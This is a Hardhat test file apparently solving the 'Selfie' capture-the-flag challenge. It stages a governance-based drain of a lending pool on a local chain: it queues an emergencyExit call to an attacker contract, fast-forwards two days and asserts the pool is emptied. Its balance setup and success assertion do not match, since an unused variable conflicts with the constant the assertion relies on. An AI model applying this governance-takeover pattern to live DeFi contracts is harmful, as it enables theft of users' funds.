const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Selfie", function () {
  this.timeout(0);

  const TOKENS_IN_POOL = ethers.utils.parseEther("1500000");
  const INITIAL_SUPPLY = ethers.utils.parseEther("2000000");
  const ATTACKER_INITIAL_BALANCE = ethers.utils.parseEther("500000");

  before(async function () {
    /** SETUP SCENARIO */
    const setup = async () => {
      const [deployer, attacker, ..._] = await ethers.getSigners();

      const SelfiePool = await ethers.getContractFactory("SelfiePool");
      const SelfieAttacker = await ethers.getContractFactory("SelfieAttacker");
      const DamnValuableTokenSnapshot = await ethers.getContractFactory("DamnValuableTokenSnapshot");
      const SimpleGovernance = await ethers.getContractFactory("SimpleGovernance");

      const token = await DamnValuableTokenSnapshot.deploy(INITIAL_SUPPLY);
      const governance = await SimpleGovernance.deploy(token.address);
      const pool = await SelfiePool.deploy(token.address, governance.address);

      // Increase the attacker initial balance
      const attackerInitialBalance = ethers.utils.parseEther("1500000");
      const attackerContract = await SelfieAttacker.deploy(pool.address, governance.address, token.address);

      // Transfer initial tokens to the pool
      await token.transfer(pool.address, TOKENS_IN_POOL);

      return { attacker, deployer, pool, governance, token, attackerContract };
    };

    Object.assign(this, await setup());
  });

  it("Exploit", async function () {
    const drainPoolTx = this.pool.interface.encodeFunctionData("emergencyExit", [this.attackerContract.address]);
    await this.attackerContract.attack(0, drainPoolTx);
    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // add 2 days
    await ethers.provider.send("evm_mine"); // mine the next block
    await this.attackerContract.finalizeAttack();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(await this.token.balanceOf(this.attacker.address)).to.equal(0);
    expect(await this.token.balanceOf(this.pool.address)).to.equal(0);
    expect(await this.token.balanceOf(this.attackerContract.address)).to.equal(TOKENS_IN_POOL.add(ATTACKER_INITIAL_BALANCE));
  });
});
